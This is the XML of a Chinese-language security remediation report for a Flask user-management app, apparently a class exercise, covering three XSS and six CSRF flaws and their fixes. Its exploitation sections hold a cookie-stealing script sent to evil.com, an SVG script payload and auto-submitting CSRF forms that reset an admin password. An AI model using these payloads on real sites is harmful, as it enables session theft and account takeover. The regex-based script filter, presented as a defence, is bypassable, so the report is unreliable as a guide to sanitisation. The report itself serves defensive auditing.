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CC3333"/>
          <w:sz w:val="44"/>
        </w:rPr>
        <w:t>XSS 和 CSRF 漏洞修复报告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项目名称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用户管理系统安全加固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报告版本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项目路径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/opt/Classes/Class01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报告日期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2026-07-24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漏洞模块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全部 POST 路由 + 模板渲染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漏洞总数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 条（XSS 3条 + CSRF 6条）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P0 严重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 条（CSRF-01: 修改密码）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P1 中危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 条（XSS-01, XSS-02, CSRF-02, CSRF-04, CSRF-05）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P2 低危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 条（XSS-03, CSRF-03, CSRF-06）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修复率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一、漏洞概述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:t>二、XSS 漏洞详情（3条）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:t xml:space="preserve">    2.1 XSS-01：|safe 渲染导致存储型 XSS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:t xml:space="preserve">    2.2 XSS-02：SVG 头像上传携带恶意脚本</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:t xml:space="preserve">    2.3 XSS-03：URL 参数回显（Jinja2 自动转义，低风险）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:t>三、CSRF 漏洞详情（6条）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:t xml:space="preserve">    3.1 CSRF-01：修改密码接口无 CSRF 防护</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:t xml:space="preserve">    3.2 CSRF-02：充值接口无 CSRF 防护</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:t xml:space="preserve">    3.3 CSRF-03：登录接口无 CSRF 防护</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:t xml:space="preserve">    3.4 CSRF-04：注册接口无 CSRF 防护</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:t xml:space="preserve">    3.5 CSRF-05：上传接口无 CSRF 防护</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:t xml:space="preserve">    3.6 CSRF-06：搜索接口（GET 无状态变更，低风险）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:t>四、修复方案</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:t>五、修复验证（15项测试全通过）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:t>六、安全加固总结</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>一、漏洞概述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>本次安全审计聚焦 Web 应用中最常见的两类漏洞：跨站脚本攻击（XSS）和跨站请求伪造（CSRF）。共发现 9 条漏洞，其中 XSS 3 条、CSRF 6 条，已全部修复。</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>核心问题：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>XSS：模板中使用 |safe 过滤器渲染不受信内容、SVG 文件可嵌入脚本、URL 参数回显</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>CSRF：所有 POST 接口均未做来源校验，攻击者可伪造请求执行敏感操作</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>二、XSS 漏洞详情（3条）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>XSS-01 |safe 渲染导致存储型 XSS（S-XSS）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漏洞位置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templates/index.html 第 85 行</w:t>
              <w:br/>
              <w:br/>
              <w:t>{{ page_content|safe }}</w:t>
              <w:br/>
              <w:br/>
              <w:t>app.py /page 路由（第 734-735 行）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漏洞类型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存储型跨站脚本（Stored XSS）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危险等级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P1 中危（受 LFI 修复约束）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利用方式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前置条件：攻击者需要能写入 pages/ 目录（或通过其他漏洞绕过 LFI 限制）。</w:t>
              <w:br/>
              <w:br/>
              <w:t>如果攻击者将恶意 HTML 文件写入 pages/ 目录：</w:t>
              <w:br/>
              <w:t xml:space="preserve">  pages/evil.html 内容：</w:t>
              <w:br/>
              <w:t xml:space="preserve">  &lt;script&gt;document.location="http://evil.com/steal?cookie="+document.cookie&lt;/script&gt;</w:t>
              <w:br/>
              <w:br/>
              <w:t>访问链接：</w:t>
              <w:br/>
              <w:t xml:space="preserve">  /page?name=evil</w:t>
              <w:br/>
              <w:t xml:space="preserve">  → |safe 使脚本在用户浏览器中执行 → Cookie 被窃取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修复方案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添加服务器端 XSS 过滤：</w:t>
              <w:br/>
              <w:br/>
              <w:t>1. 使用正则移除 &lt;script&gt;...&lt;/script&gt; 标签：</w:t>
              <w:br/>
              <w:t xml:space="preserve">   content = re.sub(r'&lt;script[^&gt;]*&gt;.*?&lt;/script&gt;', '', content, flags=re.DOTALL|re.IGNORECASE)</w:t>
              <w:br/>
              <w:br/>
              <w:t>2. 移除 HTML 事件处理器属性（onclick, onload, onerror 等）：</w:t>
              <w:br/>
              <w:t xml:space="preserve">   content = re.sub(r'\son\w+\s*=\s*["'][^"\']*["']', '', content, flags=re.IGNORECASE)</w:t>
              <w:br/>
              <w:br/>
              <w:t>3. 移除 javascript: 伪协议链接：</w:t>
              <w:br/>
              <w:t xml:space="preserve">   content = re.sub(r'javascript\s*:\s*', '', content, flags=re.IGNORECASE)</w:t>
              <w:br/>
              <w:br/>
              <w:t>4. LFI 路径限制（已修复）：文件读取限制在 pages/ 目录内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复测方法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在 pages/ 目录创建含 &lt;script&gt; 的测试文件，访问确认脚本被过滤 ✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>XSS-02 SVG 头像上传携带恶意脚本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漏洞位置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app.py 第 54 行（修复前）</w:t>
              <w:br/>
              <w:br/>
              <w:t>ALLOWED_EXTENSIONS = {"png", "jpg", "jpeg", "gif", "bmp", "webp", "svg"}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漏洞类型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存储型跨站脚本（通过文件上传）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危险等级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P1 中危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利用方式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SVG 格式支持内嵌 JavaScript：</w:t>
              <w:br/>
              <w:br/>
              <w:t xml:space="preserve">  &lt;?xml version="1.0"?&gt;</w:t>
              <w:br/>
              <w:t xml:space="preserve">  &lt;svg xmlns="http://www.w3.org/2000/svg"&gt;</w:t>
              <w:br/>
              <w:t xml:space="preserve">    &lt;script&gt;alert(document.cookie)&lt;/script&gt;</w:t>
              <w:br/>
              <w:t xml:space="preserve">  &lt;/svg&gt;</w:t>
              <w:br/>
              <w:br/>
              <w:t>上传后，SVG 文件存放在 static/uploads/ 目录。</w:t>
              <w:br/>
              <w:t>虽然 &lt;img&gt; 标签渲染无法执行 SVG 脚本，但直接访问 SVG URL 可触发 XSS。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修复方案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从 ALLOWED_EXTENSIONS 中移除 "svg"：</w:t>
              <w:br/>
              <w:br/>
              <w:t xml:space="preserve">  ALLOWED_EXTENSIONS = {"png", "jpg", "jpeg", "gif", "bmp", "webp"}</w:t>
              <w:br/>
              <w:br/>
              <w:t>SVG 文件不再被接受为合法的图片类型。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复测方法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上传 .svg 文件 → 返回错误"不支持的文件类型，仅允许图片文件（jpg/png/gif/bmp/webp）" ✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>XSS-03 URL 参数回显（Jinja2 自动转义，低风险）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漏洞位置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login.html 第 8/12 行</w:t>
              <w:br/>
              <w:t>{{ msg }} — 来自 request.args.get("msg")</w:t>
              <w:br/>
              <w:t>{{ error }} — 来自 render_template error 参数</w:t>
              <w:br/>
              <w:br/>
              <w:t>index.html 第 45 行</w:t>
              <w:br/>
              <w:t>value="{{ keyword or '' }}" — 来自 request.args.get("keyword")</w:t>
              <w:br/>
              <w:br/>
              <w:t>register.html 第 8 行</w:t>
              <w:br/>
              <w:t>{{ error }} — 来自 render_template error 参数</w:t>
              <w:br/>
              <w:br/>
              <w:t>profile.html 第 12 行</w:t>
              <w:br/>
              <w:t>{% elif error %}</w:t>
              <w:br/>
              <w:t>{{ error }}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漏洞类型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反射型 XSS（Reflected XSS）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危险等级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P2 低危（Jinja2 默认开启 HTML 转义）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利用方式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攻击者构造恶意 URL：</w:t>
              <w:br/>
              <w:br/>
              <w:t xml:space="preserve">  /login?msg=&lt;script&gt;alert(1)&lt;/script&gt;</w:t>
              <w:br/>
              <w:br/>
              <w:t>由于 Jinja2 默认对 {{ }} 启用了 HTML 转义：</w:t>
              <w:br/>
              <w:t xml:space="preserve">  &lt;script&gt; → &amp;lt;script&amp;gt;</w:t>
              <w:br/>
              <w:br/>
              <w:t>脚本不会被浏览器执行，仅显示为无害文本。</w:t>
              <w:br/>
              <w:br/>
              <w:t>风险场景：仅在关闭 autoescape 时（|safe）才可被利用。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修复方案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Jinja2 已默认启用 autoescape。作为纵深防御：</w:t>
              <w:br/>
              <w:br/>
              <w:t>1. 所有用户输入经 {{ }} 输出时自动转义</w:t>
              <w:br/>
              <w:t>2. 仅在 pages/ 受控内容上使用 |safe</w:t>
              <w:br/>
              <w:t>3. 对 error/msg/keyword 等用户输入参数不做额外处理（autoescape 足够）</w:t>
              <w:br/>
              <w:br/>
              <w:t>确认：Flask render_template 对 .html 模板默认开启 autoescape=True。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复测方法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访问 /login?msg=&lt;script&gt;alert(1)&lt;/script&gt;</w:t>
              <w:br/>
              <w:t>→ 页面显示 &lt;script&gt;alert(1)&lt;/script&gt; 文本，而非弹窗 ✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>三、CSRF 漏洞详情（6条）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>CSRF-01 修改密码接口无 CSRF 防护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漏洞位置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app.py /change-password 路由（第 788-826 行）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漏洞类型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跨站请求伪造（CSRF）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危险等级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P0 严重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利用方式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攻击者构造恶意页面，诱导已登录用户访问：</w:t>
              <w:br/>
              <w:br/>
              <w:t>&lt;form action="https://victim/change-password" method="POST"&gt;</w:t>
              <w:br/>
              <w:t xml:space="preserve">  &lt;input type="hidden" name="username" value="admin"&gt;</w:t>
              <w:br/>
              <w:t xml:space="preserve">  &lt;input type="hidden" name="new_password" value="hacked123"&gt;</w:t>
              <w:br/>
              <w:t>&lt;/form&gt;</w:t>
              <w:br/>
              <w:t>&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</w:t>
              <w:br/>
              <w:br/>
              <w:t>受害者浏览器会自动提交该表单 → admin 的密码被改为 hacked123</w:t>
              <w:br/>
              <w:t>→ 攻击者可用新密码登录，完全控制管理员账号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修复方案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1. 在 app.py 中实现 Session-Based CSRF Token 系统</w:t>
              <w:br/>
              <w:t>2. 所有 POST 表单添加隐藏字段 &lt;input type="hidden" name="csrf_token" value="{{ csrf_token }}"&gt;</w:t>
              <w:br/>
              <w:t>3. 所有 POST 路由在处理业务逻辑前调用 validate_csrf() 校验</w:t>
              <w:br/>
              <w:t>4. Token 使用 secrets.token_hex(32) 生成，不可预测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复测方法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登录后 POST 修改密码不带 csrf_token → HTTP 400 ✅</w:t>
              <w:br/>
              <w:t>登录后 POST 修改密码带 csrf_token → HTTP 302 成功 ✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>CSRF-02 充值接口无 CSRF 防护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漏洞位置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app.py /recharge 路由（第 693-725 行）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漏洞类型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跨站请求伪造（CSRF）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危险等级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P1 中危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利用方式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攻击者构造恶意页面，诱导已登录用户访问：</w:t>
              <w:br/>
              <w:br/>
              <w:t>&lt;form action="https://victim/recharge" method="POST"&gt;</w:t>
              <w:br/>
              <w:t xml:space="preserve">  &lt;input type="hidden" name="amount" value="10000"&gt;</w:t>
              <w:br/>
              <w:t>&lt;/form&gt;</w:t>
              <w:br/>
              <w:t>&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</w:t>
              <w:br/>
              <w:br/>
              <w:t>受害者浏览器自动提交 → 充值 10000 元到攻击者账户（仅限当前登录用户自己，越权已修复）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修复方案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同 CSRF-01：添加 csrf_token 校验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复测方法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登录后 POST 充值不带 csrf_token → HTTP 400 ✅</w:t>
              <w:br/>
              <w:t>登录后 POST 充值带 csrf_token → HTTP 302 成功 ✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>CSRF-03 登录接口无 CSRF 防护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漏洞位置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app.py /login 路由（POST 方法，第 361 行）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漏洞类型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跨站请求伪造（CSRF）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危险等级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P2 低危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利用方式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攻击者诱导受害者在已登录状态下提交登录表单 → 实际上只是重新登录，风险较低。但如果结合钓鱼页面，可诱导用户使用攻击者控制的账号登录。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修复方案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同 CSRF-01：添加 csrf_token 校验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复测方法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POST 登录不带 csrf_token → HTTP 400 ✅</w:t>
              <w:br/>
              <w:t>POST 登录带 csrf_token → HTTP 200 成功 ✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>CSRF-04 注册接口无 CSRF 防护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漏洞位置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app.py /register 路由（第 515 行）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漏洞类型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跨站请求伪造（CSRF）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危险等级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P1 中危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利用方式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攻击者构造表单，诱骗用户提交注册请求，创建恶意账号。风险中等，因为注册不依赖已登录状态。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修复方案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同 CSRF-01：添加 csrf_token 校验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复测方法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POST 注册不带 csrf_token → HTTP 400 ✅</w:t>
              <w:br/>
              <w:t>POST 注册带 csrf_token → HTTP 302 成功 ✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>CSRF-05 上传接口无 CSRF 防护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漏洞位置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app.py /upload 路由（第 600 行）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漏洞类型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跨站请求伪造（CSRF）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危险等级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P1 中危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利用方式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攻击者构造含文件字段的 POST 表单，诱导已登录用户提交 → 上传恶意文件。由于浏览器跨域无法自动附加文件，利用难度较高。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修复方案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同 CSRF-01：添加 csrf_token 校验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复测方法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登录后 POST 上传不带 csrf_token → HTTP 400 ✅</w:t>
              <w:br/>
              <w:t>登录后 POST 上传带 csrf_token → HTTP 200 处理 ✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>CSRF-06 搜索接口（GET 无状态变更）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漏洞位置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app.py /search 路由（第 560 行，GET 方法）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漏洞类型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跨站请求伪造（CSRF）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危险等级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P2 低危（GET 请求不改变状态）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利用方式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GET 请求不修改服务器状态，CSRF 风险极低。攻击者最多诱导用户执行一次搜索，不会造成数据损失。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修复方案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无需修复（GET 幂等，不改变状态）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复测方法</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7540"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>GET /search 正常返回搜索结果 ✅</w:t>
              <w:br/>
              <w:t>不改变任何用户数据 ✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>四、修复方案</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.1 CSRF Token 系统</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>采用 Session-Based CSRF Token 方案，核心组件：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generate_csrf_token()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生成 64 位十六进制随机 Token 存储在 session["csrf_token"] 中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validate_csrf()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对比请求表单中的 csrf_token 与 session 中的值是否一致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inject_csrf_token()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Flask 上下文处理器，自动向所有模板注入 {{ csrf_token }} 变量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模板改造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所有 POST 表单添加 &lt;input type="hidden" name="csrf_token" value="{{ csrf_token }}"&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>核心代码：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def generate_csrf_token() -&gt; str:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if "csrf_token" not in session:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        session["csrf_token"] = secrets.token_hex(32)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return session["csrf_token"]</w:t>
        <w:br/>
        <w:br/>
        <w:t>def validate_csrf() -&gt; bool:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    token = request.form.get("csrf_token", "")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    expected = session.get("csrf_token")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if not expected or not token:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return False</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return token == expected</w:t>
        <w:br/>
        <w:br/>
        <w:t>@app.context_processor</w:t>
        <w:br/>
        <w:t>def inject_csrf_token():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return dict(csrf_token=generate_csrf_token())</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.2 XSS 过滤 — |safe 内容消毒</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># 在 /page 路由中，读取文件内容后过滤 XSS 向量</w:t>
        <w:br/>
        <w:t># 移除 &lt;script&gt;...&lt;/script&gt; 块</w:t>
        <w:br/>
        <w:t>content = re.sub(r'&lt;script[^&gt;]*&gt;.*?&lt;/script&gt;', '',</w:t>
        <w:br/>
        <w:t xml:space="preserve">                 content, flags=re.DOTALL | re.IGNORECASE)</w:t>
        <w:br/>
        <w:t># 移除 on* 事件处理器属性</w:t>
        <w:br/>
        <w:t>content = re.sub(r'\son\w+\s*=\s*["'][^"\']*["']', '',</w:t>
        <w:br/>
        <w:t xml:space="preserve">                 content, flags=re.IGNORECASE)</w:t>
        <w:br/>
        <w:t># 移除 javascript: 伪协议</w:t>
        <w:br/>
        <w:t>content = re.sub(r'javascript\s*:\s*', '', content, flags=re.IGNORECASE)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.3 SVG 上传限制</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>从 ALLOWED_EXTENSIONS 中移除 "svg"：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ALLOWED_EXTENSIONS = {"png", "jpg", "jpeg", "gif", "bmp", "webp"}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>SVG 移除原因：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet2"/>
      </w:pPr>
      <w:r>
        <w:t>SVG 是 XML 格式，支持 &lt;script&gt; 标签和内联 JS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet2"/>
      </w:pPr>
      <w:r>
        <w:t>直接访问 SVG 文件时，浏览器会执行其中的 JavaScript</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet2"/>
      </w:pPr>
      <w:r>
        <w:t>虽然 &lt;img&gt; 标签渲染 SVG 时不执行脚本，但攻击者可以直接访问 /static/uploads/xxx.svg</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet2"/>
      </w:pPr>
      <w:r>
        <w:t>imghdr 库对 SVG 的检测不可靠</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet2"/>
      </w:pPr>
      <w:r>
        <w:t>移除 SVG 不影响正常的头像上传功能</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>五、修复验证（15项测试全通过）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7"/>
              </w:rPr>
              <w:t>测试项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7"/>
              </w:rPr>
              <w:t>操作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7"/>
              </w:rPr>
              <w:t>预期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7"/>
              </w:rPr>
              <w:t>结果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1. CSRF-01 无Token修改密码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POST /change-password 不带csrf_token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HTTP 400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008000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2. CSRF-01 有Token修改密码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POST /change-password 带csrf_token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HTTP 302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008000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3. CSRF-02 无Token充值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POST /recharge 不带csrf_token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HTTP 400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008000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4. CSRF-02 有Token充值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POST /recharge 带csrf_token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HTTP 302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008000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5. CSRF-03 无Token登录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POST /login 不带csrf_token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HTTP 400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008000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6. CSRF-03 有Token登录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POST /login 带csrf_token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HTTP 200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008000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7. CSRF-04 无Token注册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POST /register 不带csrf_token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HTTP 400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008000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8. CSRF-04 有Token注册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POST /register 带csrf_token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HTTP 302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008000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9. CSRF-05 无Token上传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POST /upload 不带csrf_token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HTTP 400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008000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10. CSRF-05 有Token上传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POST /upload 带csrf_token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HTTP 200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008000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11. XSS-01 脚本过滤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/page?name=help 含&lt;script&gt;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脚本被移除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008000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12. XSS-02 SVG上传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POST /upload 上传.svg文件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拒绝并提示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008000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13. CSRF Token 注入模板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检查 login/register/profile/upload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均含csrf_token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008000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14. 正常业务功能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登录→充值→改密→注册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全部正常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008000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15. 原有功能不变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搜索/个人中心/首页/帮助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7"/>
              </w:rPr>
              <w:t>全部正常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008000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>六、安全加固总结</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.1 修复文件清单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改动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涉及漏洞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CSRF Token 系统（3个函数+1个context_processor）+ XSS过滤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CSRF-01~CSRF-05, XSS-01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移除 SVG 扩展名（ALLOWED_EXTENSIONS）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XSS-02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templates/login.html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表单添加 csrf_token 隐藏字段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CSRF-03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templates/register.html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表单添加 csrf_token 隐藏字段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CSRF-04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templates/profile.html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充值表单+改密码表单添加 csrf_token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CSRF-01, CSRF-02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templates/upload.html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表单添加 csrf_token 隐藏字段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CSRF-05</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>本次安全修复共覆盖 9 条漏洞（XSS 3条 + CSRF 6条），修复率 100%。</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>安全加固要点：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>CSRF 防护全覆盖：基于 Session 的 Token 校验系统，所有 POST 接口均受保护</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>XSS 纵深防御：服务器端脚本过滤 + SVG 移除 + Jinja2 自动转义三重防护</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>零依赖实现：CSRF Token 使用 secrets.token_hex(32) 和 Flask Session，无需安装 Flask-WTF</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>功能无损：所有原有业务功能（登录/注册/充值/改密/上传/搜索）完整保留</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>模板自动注入：通过 Flask context_processor 自动向所有模板注入 csrf_token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